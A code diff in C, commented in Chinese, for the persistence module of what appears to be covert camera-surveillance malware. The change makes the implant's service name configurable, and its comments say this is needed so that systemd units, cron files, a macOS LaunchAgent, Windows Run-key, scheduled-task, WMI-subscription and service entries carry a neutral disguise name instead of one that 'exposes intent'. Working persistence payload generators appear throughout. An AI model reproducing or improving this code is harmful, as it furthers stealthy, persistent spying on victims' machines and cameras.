@@ -23,15 +23,55 @@
  * 真实部署，故该代价为零；若将来有存量，改标记前必须先做迁移。 */
 #define MARKER "# do-not-edit:managed"
 
+/* ---- 服务名（可配） ----
+ *
+ * 此前单元名 / cron 名 / plist Label / Description 全部硬编码项目名，
+ * 而部署侧（onekey.sh）早已把落点伪装成中性名。两个名字不一致的后果，
+ * 在真机上是三重合起来的严重失效：
+ *
+ *   1) 名称伪装失效：/etc/systemd/system/<项目名>.service 与
+ *      "Description=<项目名> agent" 直接暴露意图，systemctl status 一
+ *      眼可读。部署侧改名做了，驻留段没做，等于只伪装了一半。
+ *   2) 双重驻留：部署脚本写 <中性名>.service，camd 内部 persist 又写
+ *      <项目名>.service —— 两个服务同时被拉起，两个采集进程抢同一摄像头、
+ *      句柄与内存持续增长，暴露面翻倍，而部署报告全绿。
+ *   3) 卸载残留：uninstall 只清中性名那套，项目名那套永远留着且仍在跑。
+ *
+ * 所以名字必须可配，且由部署侧单一产地决定。
+ *
+ * 【必须校验字符集】服务名被拼进 "%s/etc/systemd/system/%s.service"，
+ * 若接受任意字符串，"./" 与 ".." 就是路径穿越：写 /etc/systemd/system/
+ * ../../cron.d/x 等效于写任意路径。校验只允许 [A-Za-z0-9_-] 且首字符
+ * 非 '-'，长度 1..63（63 是 DNS 标签上限，也够服务名用）。 */
+static char g_svc_name[64] = "dayanjing";   /* 默认保持既有测试语义不变 */
+
+int persist_set_service_name(const char *name)
+{
+    size_t i;
+    if (!name || !*name) return -1;
+    if (name[0] == '-') return -1;
+    for (i = 0; name[i]; i++) {
+        char c = name[i];
+        int ok = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+                 (c >= '0' && c <= '9') || c == '_' || c == '-';
+        if (!ok) return -1;
+    }
+    if (i == 0 || i >= sizeof g_svc_name) return -1;
+    memcpy(g_svc_name, name, i + 1);
+    return 0;
+}
+
+const char *persist_service_name(void) { return g_svc_name; }
+
 /* ---------- generate（文本载荷，不写盘） ---------- */
 static size_t gen_cron(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap, "@reboot %s\n", arg ? arg : "true");
 }
 static size_t gen_systemd(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap,
-        "[Unit]\nDescription=dayanjing agent\n\n[Service]\nExecStart=%s\n"
+        "[Unit]\nDescription=%s\n\n[Service]\nExecStart=%s\n"
         "Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n",
-        arg ? arg : "/bin/true");
+        g_svc_name, arg ? arg : "/bin/true");
 }
 static size_t gen_launchagent(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap,
@@ -39,11 +79,11 @@ static size_t gen_launchagent(const char *arg, char *out, size_t cap) {
         "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
         "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
         "<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n"
-        "  <string>com.dayanjing.agent</string>\n"
+        "  <string>com.%s.agent</string>\n"
         "  <key>ProgramArguments</key>\n  <array>\n    <string>/bin/sh</string>\n"
         "    <string>-c</string>\n    <string>%s</string>\n  </array>\n"
         "  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>\n",
-        arg ? arg : "true");
+        g_svc_name, arg ? arg : "true");
 }
 static size_t gen_ldpreload(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap, "%s\n", arg ? arg : "/tmp/.agent.so");
@@ -94,26 +134,26 @@ static size_t gen_sshkey(const char *arg, char *out, size_t cap) {
 static size_t gen_registry(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap,
         "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
-        "/v DayanjingAgent /t REG_SZ /d \"%s\" /f", arg ? arg : "agent.exe");
+        "/v %sAgent /t REG_SZ /d \"%s\" /f", g_svc_name, arg ? arg : "agent.exe");
 }
 static size_t gen_schtask(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap,
-        "schtasks /create /tn DayanjingAgent /tr \"%s\" /sc onlogon /f",
+        "schtasks /create /tn %sAgent /tr \"%s\" /sc onlogon /f", g_svc_name,
         arg ? arg : "agent.exe");
 }
 static size_t gen_wmi(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap,
         "powershell -nop -c \"$f=Set-WmiInstance -Class __EventFilter "
-        "-Namespace root/subscription -Arguments @{Name='dj';Query='SELECT * FROM __InstanceModificationEvent "
+        "-Namespace root/subscription -Arguments @{Name='%s';Query='SELECT * FROM __InstanceModificationEvent "
         "WITHIN 60 WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'};"
         "$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription "
-        "-Arguments @{Name='dj';CommandLineTemplate='%s'};"
+        "-Arguments @{Name='%s';CommandLineTemplate='%s'};"
         "Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}\"",
-        arg ? arg : "agent.exe");
+        g_svc_name, g_svc_name, arg ? arg : "agent.exe");
 }
 static size_t gen_service(const char *arg, char *out, size_t cap) {
     return (size_t)snprintf(out, cap,
-        "sc create DayanjingAgent binPath= \"%s\" start= auto",
+        "sc create %sAgent binPath= \"%s\" start= auto", g_svc_name,
         arg ? arg : "agent.exe");
 }
 static size_t gen_lkm(const char *arg, char *out, size_t cap) {
@@ -164,11 +204,11 @@ static int artifact_path(persist_method_t m, const char *root_prefix,
     if (!home || !*home) home = "/root";
     switch (m) {
         case PERSIST_SYSTEMD:
-            snprintf(out, cap, "%s/etc/systemd/system/dayanjing.service", rp);
+            snprintf(out, cap, "%s/etc/systemd/system/%s.service", rp, g_svc_name);
             if (needs_marker) *needs_marker = 0;
             return 0;
         case PERSIST_CRON:
-            snprintf(out, cap, "%s/etc/cron.d/dayanjing", rp);
+            snprintf(out, cap, "%s/etc/cron.d/%s", rp, g_svc_name);
             if (needs_marker) *needs_marker = 0;
             return 0;
         case PERSIST_SSHKEY:
@@ -285,7 +325,7 @@ int persist_install(persist_method_t m, const char *root_prefix, const char *arg
         const char *rp = root_prefix ? root_prefix : "";
         char wants[640], link[768];
         snprintf(wants, sizeof wants, "%s/etc/systemd/system/multi-user.target.wants", rp);
-        snprintf(link,  sizeof link,  "%s/dayanjing.service", wants);
+        snprintf(link,  sizeof link,  "%s/%s.service", wants, g_svc_name);
         if (mkdir_p(wants, 0755) != 0) return -1;
         if (symlink(path, link) != 0 && errno != EEXIST) return -1;
     }
@@ -304,7 +344,7 @@ int persist_uninstall(persist_method_t m, const char *root_prefix, const char *a
         const char *rp = root_prefix ? root_prefix : "";
         char link[640];
         snprintf(link, sizeof link,
-                 "%s/etc/systemd/system/multi-user.target.wants/dayanjing.service", rp);
+                 "%s/etc/systemd/system/multi-user.target.wants/%s.service", rp, g_svc_name);
         unlink(link);
     }
     if (stat(path, &st) != 0) return 0;               /* 已清理 */
